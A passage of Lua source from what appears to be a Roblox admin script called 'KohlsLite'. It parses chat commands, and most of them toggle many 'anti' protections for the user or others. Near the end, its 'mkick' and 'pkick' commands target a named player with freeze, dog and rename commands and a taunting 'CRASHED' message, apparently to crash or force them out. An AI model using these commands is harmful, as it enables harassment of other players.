    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'nowater' then
                SuperCMD("gear me 88146497")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'watermap' then
                SuperCMD("gear me 236438668")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'fixpaint' then
        FixPaint()
     end

   if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'anticrash' then
        anticrash = true
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unanticrash' then
        anticrash = false
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'antigs' then -- what is this??
        YOUantigs = true
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unantigs' then 
        YOUantigs = false
    end
		
    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'2anticrash' then
        anticrash2 = true
    end

    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'2unanticrash' then
        anticrash2 = false
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'antipaint' then
        antipaint = true
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantipaint' then
        antipaint = false
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antigear' then
        antigear = true
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantigear' then
        antigear = false
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'2antigear' then
        antigear2 = true
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'2unantigear' then
        antigear2 = false
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'antigb' then
        antigb = true
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unantigb' then
        antigb = false
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'antiattach2' then
        antiattach2 = true
    end

    if string.sub(msg:lower(), 1, #prefix + 13) == prefix..'unantiattach2' then
        antiattach2 = false
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'antiattach' then
        antiattach = true
    end

    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'unantiattach' then
        antiattach = false
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'noblt' then
        noblt = true
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'unnoblt' then
        noblt = false
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'antiray' then
        antiraygun = true
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantiray' then
        antiraygun = false
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'novoid' then
                workspace.FallenPartsDestroyHeight = 0/0
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'fixvoid' then
                workspace.FallenPartsDestroyHeight = -10001
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'pinglogs' then
        PingLogs = true
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unpinglogs' then
        PingLogs = false
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antilogs' then
        AntiLogs = true
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantilogs' then
        AntiLogs = false
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'pingcsys' then
        PingCsystem = true
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unpingcsys' then
        PingCsystem = false
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'noobdetect' then
        noobdetect = true
    end

    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'unnoobdetect' then
        noobdetect = false
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'antiblind' then
        YOUantiblind = true
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unantiblind' then
        YOUantiblind = false
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'antiaddon' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantiaddon = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantiaddon = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                YOUantiaddon = true
                ALLantiaddon = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unantiaddon' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantiaddon = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantiaddon = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                YOUantiaddon = false
                ALLantiaddon = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'anticlone' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUanticlone = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLanticlone = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                YOUanticlone = true
                ALLanticlone = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unanticlone' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUanticlone = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLanticlone = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                YOUanticlone = false
                ALLanticlone = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'antidog' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantidog = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantidog = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                YOUantidog = true
                ALLantidog = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantidog' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantidog = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantidog = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                YOUantidog = false
                ALLantidog = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end    
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antifire' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantifire = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantifire = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                YOUantifire = true
                ALLantifire = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantifire' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantifire = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantifire = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                YOUantifire = false
                ALLantifire = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end   
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'antifreeze' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantifreeze = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantifreeze = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                YOUantifreeze = true
                ALLantifreeze = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end
    end

   if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'unantifreeze' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantifreeze = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantifreeze = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                YOUantifreeze = false
                ALLantifreeze = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end   
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'antiff' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantiff = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantiff = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                YOUantiff = true
                ALLantiff = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end    
    end

  if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unantiff' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantiff = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantiff = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                YOUantiff = false
                ALLantiff = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end    
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antiglow' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantiglow = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantiglow = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                YOUantiglow = true
                ALLantiglow = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end    
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantiglow' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantiglow = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantiglow = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                YOUantiglow = false
                ALLantiglow = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end    
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'antihc' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantihealthc = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantihealthc = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                YOUantihealthc = true
                ALLantihealthc = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end    
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unantihc' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantihealthc = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantihealthc = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                YOUantihealthc = false
                ALLantihealthc = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end    
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antijail' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantijail = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantijail = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                YOUantijail = true
                ALLantijail = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end    
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantijail' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantijail = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantijail = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                YOUantijail = false
                ALLantijail = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end    
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antijump' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantijump = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantijump = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                YOUantijump = true
                ALLantijump = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end    
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantijump' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantijump = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantijump = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                YOUantijump = false
                ALLantijump = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end    
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antikill' then
        local args = string.split(msg, " ")
	if #args == 2 then
        	if args[2] == "me" then
                	YOUantikill = true
                	Remind("Turned this anti on for you!")
        	elseif args[2] == "others" then
                	ALLantikill = true
                	Remind("Turned this anti on for others!")
        	elseif args[2] == "all" then
               		YOUantikill = true
                	ALLantikill = true
                	Remind("Turned this anti on for everyone!")
        	else
		  	kia = args[2]
           	  	PLAYERCHECK(kia)
	         	if player ~= nil then
				if not table.find(antikill, player) then
					Remind(player.." is on the list now!")
					table.insert(antikill, player)
				else
					Remind(player.." is already in the table!")
				end
                 	else                           
                        	Remind('Cannot find player with the name: '..dasplayer)
			end
                end
	else
                Remind("Invalid amount of arguments: Must be me, others, all or a player!")
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantikill' then
        local args = string.split(msg, " ")
        if #args == 2 then
        	if args[2] == "me" then
                	YOUantikill = false
                	Remind("Turned this anti off for you!")
        	elseif args[2] == "others" then
                	ALLantikill = false
                	Remind("Turned this anti off for others!")
        	elseif args[2] == "all" then
               		YOUantikill = false
                	ALLantikill = false
                	Remind("Turned this anti off for everyone!")
        	else
		  	kia = args[2]
           	  	PLAYERCHECK(kia)
	         	if player ~= nil then
				if table.find(antikill, player) then
					Remind(player.." is no longer in the table!")
					table.remove(antikill, table.find(antikill, player))
				else
					Remind(player.." was never in the list!")
				end
                 	else                           
                        	Remind('Cannot find player with the name: '..dasplayer)
			end
                end
	else
                Remind("Invalid amount of arguments: Must be me, others, all or a player!")
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'antifly' then -- forgot to add this to the list lmao
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantifly = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantifly = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                YOUantifly = true
                ALLantifly = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantifly' then -- forgot to add this to the list lmao
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantifly = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantifly = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                YOUantifly = false
                ALLantifly = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'antinoc' then -- yes
                YOUantinoclip = true
                Remind("Turned this anti on for you!")
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantinoc' then -- yes
                YOUantinoclip = false
                Remind("Turned this anti off for you!")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antichar' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantichar = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantichar = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                YOUantichar = true
                ALLantichar = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end    
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantichar' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantichar = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantichar = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                YOUantichar = false
                ALLantichar = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end    
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'antimsg' then
        YOUantimsg = true
        Remind("Turned this anti on for you!")
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantimsg' then
        YOUantimsg = false
        Remind("Turned this anti off for you!")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antiname' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantiname = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantiname = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                YOUantiname = true
                ALLantiname = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end     
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantiname' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantiname = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantiname = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                YOUantiname = false
                ALLantiname = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end     
    end

    if string.sub(msg:lower(), 1, #prefix + 13) == prefix..'antiparticles' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantiparticles = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantiparticles = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                YOUantiparticles = true
                ALLantiparticles = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end     
    end

    if string.sub(msg:lower(), 1, #prefix + 15) == prefix..'unantiparticles' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantiparticles = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantiparticles = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                YOUantiparticles = false
                ALLantiparticles = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end     
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'antipunish' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantipunish = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantipunish = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                YOUantipunish = true
                ALLantipunish = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end         
    end

    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'unantipunish' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantipunish = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantipunish = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                YOUantipunish = false
                ALLantipunish = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end         
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'antirocket' then
         local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantirocket = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantirocket = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                YOUantirocket = true
                ALLantirocket = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end             
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antikick' then
                antikick2 = true
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantikick' then
                antikick2 = false
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'antit' then
                antitoolm = true
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'unantit' then
                antitoolm = false
    end

    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'unantirocket' then
         local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantirocket = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantirocket = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                YOUantirocket = false
                ALLantirocket = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end             
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'antisit' then
         local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantisit = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantisit = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                YOUantisit = true
                ALLantisit = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end             
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantisit' then
         local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantisit = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantisit = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                YOUantisit = false
                ALLantisit = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end             
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'antiseizure' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantiseizure = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantiseizure = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                YOUantiseizure = true
                ALLantiseizure = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 13) == prefix..'unantiseizure' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantiseizure = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantiseizure = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                YOUantiseizure = false
                ALLantiseizure = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
     end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'antismoke' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantismoke = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantismoke = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                YOUantismoke = true
                ALLantismoke = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unantismoke' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantismoke = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantismoke = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                YOUantismoke = false
                ALLantismoke = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'antisparkles' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantisparkles = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantisparkles = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                YOUantisparkles = true
                ALLantisparkles = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end        
    end


    if string.sub(msg:lower(), 1, #prefix + 14) == prefix..'unantisparkles' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantisparkles = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantisparkles = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                YOUantisparkles = false
                ALLantisparkles = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end        
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'antispeed' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantispeed = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantispeed = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                YOUantispeed = true
                ALLantispeed = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unantispeed' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantispeed = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantispeed = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                YOUantispeed = false
                ALLantispeed = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antispin' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantispin = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantispin = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                YOUantispin = true
                ALLantispin = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantispin' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantispin = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantispin = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                YOUantispin = false
                ALLantispin = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antistun' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantistun = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantistun = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                YOUantistun = true
                ALLantistun = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantistun' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantistun = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantistun = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                YOUantistun = false
                ALLantistun = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'antistg' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantisetgrav = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantisetgrav = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                YOUantisetgrav = true
                ALLantisetgrav = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantistg' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantisetgrav = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantisetgrav = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                YOUantisetgrav = false
                ALLantisetgrav = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antiswag' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantiswag = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantiswag = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                YOUantiswag = true
                ALLantiswag = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantiswag' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                YOUantiswag = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantiswag = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                YOUantiswag = false
                ALLantiswag = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antichat' then
        antichat = true
        YOUantimsg = true -- stop you from crashing :)
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantichat' then
        antichat = false
        YOUantimsg = false
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'mkick' then -- haha i found it
        acplr = string.sub(msg:lower(), #prefix + 7)
           PLAYERCHECK(acplr)
                   if player ~= nil and not table.find(nokick, player) then
			acplr = player
                           antichatplr = true
                elseif table.find(nokick, player) then
                        Remind("Sorry, this player cannot be kicked!")
                else                           
                        Remind("Player doesn't exist!")
                  end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'unmkick' then
        antichatplr = false
        Chat("reset "..acplr)
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'pkick' then
                   acplr = string.sub(msg:lower(), #prefix + 7)
                   PLAYERCHECK(acplr)
                   if player ~= nil and not table.find(nokick, player) then
                           Chat("freeze "..acplr)
                           Chat("dog "..acplr)
                           Chat("rainbowify "..acplr)
                           Chat("name "..acplr.. " [KohlsLite]: \n Imagine Getting \n CRASHED!!!")
                        antichatplr = true
                   elseif table.find(nokick, player) then
                        Remind("Sorry, this player cannot be kicked!")
                else
